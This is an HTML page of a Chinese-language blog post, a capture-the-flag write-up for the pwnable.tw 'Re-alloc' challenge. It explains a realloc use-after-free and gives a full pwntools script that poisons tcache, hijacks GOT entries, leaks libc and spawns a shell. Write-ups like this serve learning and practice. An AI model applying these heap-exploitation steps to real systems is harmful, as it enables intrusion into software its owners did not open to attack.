@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pwnable.tw Re-alloc | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="pwnable.tw Re-alloc" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="相关：realloc、tcache2.29" />
+<meta property="og:description" content="相关：realloc、tcache2.29" />
+<link rel="canonical" href="https://www.cameudis.com/2023/04/14/pwnable-tw-re-alloc.html" />
+<meta property="og:url" content="https://www.cameudis.com/2023/04/14/pwnable-tw-re-alloc.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-04-14T07:03:41+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pwnable.tw Re-alloc" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-14T07:03:41+08:00","datePublished":"2023-04-14T07:03:41+08:00","description":"相关：realloc、tcache2.29","headline":"pwnable.tw Re-alloc","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2023/04/14/pwnable-tw-re-alloc.html"},"url":"https://www.cameudis.com/2023/04/14/pwnable-tw-re-alloc.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cameudis.com/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/links/">Links</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">pwnable.tw Re-alloc</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-04-14T07:03:41+08:00" itemprop="datePublished">Apr 14, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>相关：realloc、tcache2.29</p>
+
+<p>借用了很多巧合，实在是特别“幸运”的一个利用，和大部分网上的解法都不太一样。</p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>保护情况：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x3fe000<span class="o">)</span>
+    FORTIFY:  Enabled
+</code></pre></div></div>
+
+<p>程序是一个菜单，提供了alloc、realloc、free功能，来操作bss段的两个栏位，大致功能如下：</p>
+
+<ul>
+  <li>alloc：选中栏当前为NULL时，使用 realloc(NULL, size) 分配新的区块并读入数据；</li>
+  <li>realloc：选中栏当前非NULL时，将选中栏使用 realloc(ptr, size) 来调整大小并（如果realloc返回值非0）读入数据；</li>
+  <li>free：将选中栏使用 realloc(ptr, 0) 进行释放，并<strong>将指针置零</strong>。</li>
+</ul>
+
+<p>主要的漏洞在于realloc的使用上，可以通过RTFM（在线man地址：<a href="https://linux.die.net/man/3/realloc">realloc(3): allocate/free dynamic memory - Linux man page</a>）得到realloc的说明：</p>
+
+<blockquote>
+  <p>The <strong>realloc</strong>() function changes the size of the memory block pointed to by <em>ptr</em> to <em>size</em> bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will <em>not</em> be initialized. If <em>ptr</em> is NULL, then the call is equivalent to <em>malloc(size)</em>, for all values of <em>size</em>; if <em>size</em> is equal to zero, and <em>ptr</em> is not NULL, then the call is equivalent to <em>free(ptr)</em>. Unless <em>ptr</em> is NULL, it must have been returned by an earlier call to <strong>malloc</strong>(), <strong>calloc</strong>() or <strong>realloc</strong>(). If the area pointed to was moved, a <em>free(ptr)</em> is done.</p>
+</blockquote>
+
+<p>注意到，当ptr字段为0，realloc等价于malloc；当ptr不为0但size为0时，realloc等价于free。</p>
+
+<p>程序确实使用这两种功能来实现了malloc以及free，但是在realloc和free功能中，检查做得不够完善：</p>
+
+<ul>
+  <li>当realloc中输入size为0，可以<strong>触发free，且不将原指针置零</strong>，创造了UAF的可能。</li>
+  <li>使用free作用于空栏位（NULL），可以触发一次匿名的malloc(0)。这里的匿名指的是结果不会保存在bss段结构中，因为free会将其置零。</li>
+</ul>
+
+<p>其实另外还在alloc功能中发现了一个Off-by-NULL漏洞，但我并没有想到很好的办法来用到这个漏洞。</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>在宏观的层面上，由于程序二进制本身虽然关闭了PIE，但没有特别有用的函数，因此思路还是两步走：泄露libc地址、劫持控制流。</p>
+
+<h3 id="泄露libc地址">泄露libc地址</h3>
+
+<p>程序本身并没有能够提供打印区块数据的功能，因此想要泄露libc数据就一定需要劫持控制流。
+目前，栈地址未知排除ROP，将目标瞄准GOT：</p>
+
+<pre><code class="language-txt">off_404018 dq offset _exit  
+off_404020 dq offset __read_chk
+off_404028 dq offset puts
+off_404030 dq offset __stack_chk_fail
+off_404038 dq offset printf
+off_404040 dq offset alarm
+off_404048 dq offset atoll
+off_404050 dq offset signal
+off_404058 dq offset realloc
+off_404060 dq offset setvbuf
+off_404068 dq offset __isoc99_scanf
+</code></pre>
+
+<p>首先思考可不可以把唯一操作区块的外部函数——realloc替换为puts来泄露地址，笔者这时顾忌到题目限制了区块大小，不太方便构造 unsorted bin 中的区块。
+因此将目标瞄准了atoll，这个函数在read_long中被调用，参数是栈上用来读入数字的buffer。可以尝试用它来泄露栈上的数据。</p>
+
+<p>这时一个好主意是使用plt[printf]代替atoll，这样就可以在栈上指哪打哪，可惜笔者做的时候并没有想到这个好主意，只是用了plt[puts]。不过不影响，因为我遇到了第一个逆天的巧合：<strong>在buffer+8的位置就有一个libc地址</strong>。先介绍一下怎么覆写的：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s">"victim"</span><span class="p">)</span>
+<span class="n">realloc_free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"atoll"</span><span class="p">]))</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>     <span class="c1"># alloc a anonymous 0x20 chunk
+</span><span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x4015DC</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>第一行创建了一个0x20大小区块，第二行将其释放进入tcache，同时保留了这个指针。
+第三行使用了realloc，realloc发现这个区块大小正常就直接放行了，从而我们可以覆盖fd指针为got[atoll]。
+第四行使用free的漏洞来申请一个匿名区块，分配完之后再下一个区块就是atoll了。
+第五行将atoll覆盖为plt[puts]，并顺便把realloc覆盖为一个普通 <code class="language-plaintext highlighter-rouge">ret</code> 的地址，原因后面再说。</p>
+
+<p><em>这里需要提一嘴，我使用了匿名区块来解决这一问题：非0的栏位无法进行alloc。不过在复盘时，从网上的大佬那边发现可以通过一种非常巧妙的方式来将栏位置零，同时又不干扰已经位于tcache中的atoll地址，从而将后续利用流程也变得直观一些。
+可以通过realloc将区块变大，然后再free。这样就可以free到别的大小的tcache中，并且根本不用关注key的检查，也不会将atoll的地址覆盖，一举两得。
+参考地址见<a href="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc - Tainted Bits</a></em></p>
+
+<p>接下来泄露libc地址，由于buffer+8就有，因此简简单单就可以泄露了：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1111111</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>   <span class="c1"># just padding
+</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"1111111</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span><span class="o">-</span><span class="mh">0x1e570a</span>
+<span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h3 id="攻击">攻击！</h3>
+
+<p>目标是 get shell，由于之前已经有了指向GOT的指针（栏位1中），所以我们想办法利用realloc中最后的那个read_input函数来再次修改GOT。
+但由于realloc在中间会调用realloc（废话），直接让他realloc一个GOT中的区块大概率是要出问题的，而且程序会往realloc的返回值中读入数据。因此我们需要想一个办法让realloc调用返回之后，rax是GOT中区块的地址。</p>
+
+<p>静态分析一波，并没有发现什么 <code class="language-plaintext highlighter-rouge">mov rax, rdi; ret;</code> 的gadget，难道我的方法走不下去了吗？于是动态分析一波，惊喜地发现 <strong>程序在调用realloc之前，rax中就已经是GOT中区块地地址了</strong>，令人不得不感叹 <del>大自然</del> 出题人的鬼斧神工。</p>
+
+<p>所以就有了上面把realloc覆盖为一个简单的 <code class="language-plaintext highlighter-rouge">ret</code> 。这样一来，在执行了下面几句代码后，atoll就会变成system的地址（<strong>注意注释</strong>，很重要）：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>          <span class="c1"># now atoll is puts, so puts("\0") = 1
+</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size:"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1111111</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>   <span class="c1"># now atoll is puts, so puts("1111111\0") = 8
+# we have hijacked realloc to 'ret', and when call realloc, rax has been same as rdi (which is really coincident)
+# so program just pass and execute read_input(heap[v1], size)
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span>
+</code></pre></div></div>
+
+<p>最后，我们随便触发一个read_long，输入/bin/sh，就可以成功 get shell！当然，也可以直接输入 <code class="language-plaintext highlighter-rouge">cat ~/flag</code>，如果您需要节省时间的话。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="完整脚本">完整脚本</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Data:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">realloc</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Data:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">realloc_free</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
+
+    <span class="c1"># ---------- leak libc ----------
+</span>
+    <span class="c1"># 1.1 hijack GOT[atoll] to PLT[puts], GOT[realloc] to 'ret'
+</span>
+    <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s">"victim"</span><span class="p">)</span>
+    <span class="n">realloc_free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"atoll"</span><span class="p">]))</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>     <span class="c1"># alloc a anonymous 0x20 chunk
+</span>    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="mh">0x4015DC</span><span class="p">))</span>
+
+    <span class="c1"># 1.2 leak libc load address (from stack)
+</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1111111</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>   <span class="c1"># just padding
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"1111111</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span><span class="o">-</span><span class="mh">0x1e570a</span>
+    <span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+    <span class="c1"># ---------- hijack GOT ----------
+</span>
+    <span class="c1"># 2.1 hijack GOT[atoi] to libc[system]
+</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>          <span class="c1"># now atoll is puts, so puts("\0") = 1
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1111111</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>   <span class="c1"># now atoll is puts, so puts("1111111\0") = 8
+</span>    <span class="c1"># we have hijacked realloc to 'ret', and when call realloc, rax has been same as rdi (which is really coincident)
+</span>    <span class="c1"># so program just pass and execute read_input(heap[v1], size)
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span>
+
+    <span class="c1"># 2.2 trigger system("/bin/sh") by atoi("/bin/sh")
+</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice: "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Index:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
+    
+    <span class="n">success</span><span class="p">(</span><span class="s">"Enjoy your shell!"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+</code></pre></div></div>
+
+<p>这个故事告诉我们：涉及内存安全的函数还是要小心小心再小心，仔细阅读手册、了解边界行为……</p>
+
+  </div>
+    
+      <b>本博客上与 pwnable.tw 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2023/10/24/pwnable-tw-BabyStack-writeup.html">pwnable.tw BabyStack</a></li>
+        
+          <li><a href="/2023/10/13/pwnable-tw-Starbound-writeup.html">pwnable.tw Starbound</a></li>
+        
+          <li><a href="/2023/05/07/pwnable-tw-seethefile-writeup.html">pwnable.tw seethefile</a></li>
+        
+          <li><a href="/2023/04/14/pwnable-tw-re-alloc.html">pwnable.tw Re-alloc</a></li>
+        
+          <li><a href="/2023/02/01/pwnable-tw-tcache-tear-writeup.html">pwnable.tw tcache_tear</a></li>
+        
+          <li><a href="/2022/09/08/pwnable-tw-applestore-writeup.html">pwnable.tw applestore</a></li>
+        
+          <li><a href="/2022/09/01/pwnable-tw-hacknote-writeup.html">pwnable.tw hacknote</a></li>
+        
+          <li><a href="/2022/08/07/pwnable-tw-silver-bullet-writeup.html">pwnable.tw silver_bullet</a></li>
+        
+          <li><a href="/2022/08/06/pwnable-tw-dubblesort-writeup.html">pwnable.tw dubblesort</a></li>
+        
+          <li><a href="/2022/08/04/pwnable-tw-3x17-writeup.html">pwnable.tw 3x17</a></li>
+        
+      </ul>
+    
+  
+
+  <div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2023/04/14/pwnable-tw-re-alloc.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
